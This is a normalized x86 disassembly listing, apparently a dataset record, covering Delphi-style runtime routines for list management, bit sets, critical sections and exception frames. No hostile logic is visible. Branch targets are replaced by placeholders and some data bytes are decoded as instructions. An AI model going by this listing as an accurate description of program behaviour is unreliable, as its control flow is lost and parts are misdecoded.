call sub_41351c
sub_4136e2
add [ eax ] al
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_413704
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413750
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4137ec
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028c8
mov edx esi
mov eax ebx
call sub_413860
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4137b4
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_4137b0
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1fc
jmp sub_403864
sub_4137ec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_413834
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4059ac
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_4137b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41383b
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_413860
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4137ec
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_413888
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_413a1c
retn
sub_4138bc
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_4138dc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4137ec
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028c8
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413954
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp esi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4137ec
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebx
call sub_413860
mov ebp eax
mov eax [ ebx + 0x4 ]
xor edx edx
mov [ eax + edi * 4 ] edx
mov edx edi
mov eax ebx
call sub_413750
xor ecx ecx
mov edx esi
mov eax ebx
call sub_4138dc
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] ebp
sub_4139ac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4137ec
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4139fc
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4138bc
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_413750
sub_413a1c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4137ec
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_40270c
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_413a58
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4137ec
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_413a1c
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402b04
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_413750
dec ebp
inc edi
jne r-xdata
sub_413acc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030c0
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_413b20
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403464
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_413c24
xor eax eax
push ebp
push sub_413b82
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4030f0
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4030e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413b89
mov eax [ ebp - 0x4 ]
call sub_413c88
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_413b9c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_413c24
xor eax eax
push ebp
push sub_413c18
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413704
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4138bc
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413c1f
mov eax [ ebp - 0x4 ]
call sub_413c88
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_4137ec
sub_413c38
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_413c24
xor eax eax
push ebp
push sub_413c7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4139fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413c82
mov eax [ ebp - 0x4 ]
call sub_413c88
retn
sub_413c94
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_413ce8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_413ce8
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_413cc4
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026cc
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402b04
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_4026ec
mov edx edi
mov eax ebp
call sub_413cdc
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028c8
sub_413d8c
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_413cc4
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_413ce8
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_413db8
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_413e30
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax esi
call sub_4168d4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_413e70
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_413f26
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f44
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403040
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404110
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403040
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2b8
call sub_403864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413f2d
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_413f4c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_413fe1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403040
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_404110
mov eax ebx
mov si 0xffff
call sub_4032ec
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413fe8
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
mov eax ebx
mov si 0xffff
call sub_4032ec
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_4032ec
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_40422c
sub_413ff3
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_40332c
mov eax ebx
mov si 0xffff
call sub_4032ec
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_4032ec
push eax
lea eax [ ebx + 0x4 ]
call sub_4054e8
mov ecx eax
mov edx r-xdata
pop eax
call sub_4031a4
sub_41403e
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_414070
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_414090
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4031a4
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_4140b8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax edi
call sub_4054e8
test ebx ebx
je r-xdata
xor eax eax
mov [ edi ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
mov si 0xffff
call sub_4032ec
mov esi eax
test esi esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax edi
call sub_4054e8
mov edx eax
mov eax esi
call sub_4140b8
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax edi
call sub_4054e8
push eax
push r-xdata
push ebx
mov eax [ ebx ]
call [ eax + 0x28 ]
jmp r-xdata
sub_414150
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_4141a5
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4054e8
mov edx eax
mov eax edi
call sub_4140b8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4141ac
lea eax [ ebp - 0x4 ]
call sub_4054e8
retn
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_4141b4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_4141ec
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413e30
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_41421c
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
test dl dl
je r-xdata
mov edx eax
xor edx edx
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_414258
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_403040
mov edx esp
mov eax esi
call sub_404110
add esp 0x100
pop esi
pop ebx
retn
sub_414280
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_414315
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax [ ebx ]
call sub_403040
lea edx [ ebp - 0x114 ]
mov eax edi
call sub_404110
push edi
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov si 0xfffe
call sub_4032ec
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov eax ebx
call sub_414240
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408940
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41431c
lea eax [ ebp - 0x14 ]
call sub_403eac
retn
sub_414338
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_414498
mov edx ebx
mov eax esi
call sub_414430
sub_414368
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_414240
test eax eax
jl r-xdata
pop esi
pop ebx
retn
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
mov ecx esi
xchg edx eax
call sub_413954
mov dl 0x1
mov eax ebx
call sub_41421c
sub_414398
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_4143c8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_414422
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_413948
call sub_4030f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_414430
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_40327c
test al al
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_413704
mov [ esi + 0x4 ] ebx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x8 ] eax
inc [ ebx + 0x10 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax ebx
call sub_4143b8
xor ecx ecx
mov edx esi
mov eax ebx
call sub_414150
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_4137ec
sub_414498
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov cl 0x1
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_413948
cmp esi eax
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4139fc
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_413750
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
mov cl 0x1
mov edx esi
mov eax ebx
call sub_414150
mov eax ebx
call sub_4143b8
pop edi
pop esi
pop ebx
retn
sub_4144ec
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_415044
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413e30
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_41451c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414540
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_414564
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41460b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4146b4
xor eax eax
push ebp
push sub_4145ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4145f5
mov eax [ ebp - 0x4 ]
call sub_414770
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_41461c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_413e5c
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4146b4
xor eax eax
push ebp
push sub_41469c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414770
retn
sub_4146cc
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_414784
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_414724
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_414edc
mov eax [ ebp - 0x8 ]
push eax
push sub_41518c
push ebp
call sub_4146cc
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414784
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414819
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414820
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403ed0
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_4042b8
jne r-xdata
sub_414830
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_41482c
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1fc
jmp sub_403864
sub_414868
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4148b0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4059ac
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_414830
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4148b7
